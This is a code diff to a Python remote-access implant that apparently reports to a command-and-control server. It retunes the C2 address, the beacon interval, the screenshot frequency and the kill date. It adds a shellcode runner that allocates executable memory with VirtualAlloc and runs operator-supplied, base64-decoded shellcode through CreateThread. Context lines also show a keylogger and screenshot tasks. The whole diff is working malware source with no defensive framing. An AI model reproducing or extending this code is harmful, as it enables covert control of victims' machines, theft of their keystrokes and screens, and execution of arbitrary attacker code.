@@ -37,18 +37,18 @@ import random, inspect, tempfile
 # ======================
 class Config:
     def __init__(self):
-        self.C2_SERVER = "https://192.168.16.78"
+        self.C2_SERVER = "https://192.168.147.1"
         self.AES_KEY = b"32bytekey-ultra-secure-123456789"
         self.AES_IV = b"16byteiv-9876543"
         self.USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-        self.CHECKIN_INTERVAL = 100
+        self.CHECKIN_INTERVAL = 10
         self.SOCKS5_PORT = 1080
         self.MAX_UPLOAD_SIZE = 10 * 1024 * 1024
         self.DEBUG = True
         self.TAKE_SCREENSHOTS = True
-        self.SCREENSHOT_FREQUENCY = 10
+        self.SCREENSHOT_FREQUENCY = 30
         self.KILLDATE_ENABLED = True
-        self.KILLDATE = "2025-05-04 21:00" if True else ""
+        self.KILLDATE = "2025-05-05 12:00" if True else ""
 
 # ======================
 # Encryption
@@ -1061,6 +1061,57 @@ class Keylogger:
             else:
                 self.log += f"[{key}]"
 
+
+# ======================
+# Shellcode-Runner
+# ======================
+
+class ShellcodeRunner:
+    @staticmethod
+    def execute(shellcode_bytes):
+        try:
+            # Allocate memory with PAGE_EXECUTE_READWRITE
+            ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
+            ptr = ctypes.windll.kernel32.VirtualAlloc(
+                ctypes.c_int(0),
+                ctypes.c_int(len(shellcode_bytes)),
+                ctypes.c_int(0x3000),  # MEM_COMMIT | MEM_RESERVE
+                ctypes.c_int(0x40)     # PAGE_EXECUTE_READWRITE
+            )
+            
+            if not ptr:
+                return {"status": "error", "message": "VirtualAlloc failed"}
+            
+            # Copy shellcode to allocated memory
+            buf = (ctypes.c_char * len(shellcode_bytes)).from_buffer_copy(shellcode_bytes)
+            ctypes.windll.kernel32.RtlMoveMemory(
+                ctypes.c_void_p(ptr),
+                buf,
+                ctypes.c_int(len(shellcode_bytes))
+            )
+            
+            # Create thread to execute shellcode
+            thread = ctypes.windll.kernel32.CreateThread(
+                ctypes.c_int(0),
+                ctypes.c_int(0),
+                ctypes.c_void_p(ptr),
+                ctypes.c_int(0),
+                ctypes.c_int(0),
+                ctypes.pointer(ctypes.c_int(0)))
+            
+            if not thread:
+                return {"status": "error", "message": "CreateThread failed"}
+            
+            # Wait for thread to finish
+            ctypes.windll.kernel32.WaitForSingleObject(
+                ctypes.c_int(thread),
+                ctypes.c_int(-1))
+            
+            return {"status": "success", "message": "Shellcode executed"}
+            
+        except Exception as e:
+            return {"status": "error", "message": str(e)}
+
 # ======================
 # WebSocket Client
 # ======================
@@ -1534,6 +1585,26 @@ class Agent:
                     "terminal": True  # This flag helps the server identify terminal output
                 }
             
+            elif task_type == "shellcode":
+                try:
+                    shellcode_b64 = task.get("data", {}).get("shellcode", "")
+                    if not shellcode_b64:
+                        return {
+                            "status": "error",
+                            "message": "No shellcode provided"
+                        }
+                        
+                    shellcode_bytes = base64.b64decode(shellcode_b64)
+                    return ShellcodeRunner.execute(shellcode_bytes)
+                    
+                except Exception as e:
+                    self._log_error(f"Shellcode execution failed: {str(e)}")
+                    return {
+                        "status": "error",
+                        "message": f"Shellcode execution failed: {str(e)}"
+                    }
+
+
             elif task_type == "screenshot":
                 screenshot = SystemUtils.take_screenshot()
                 if screenshot:
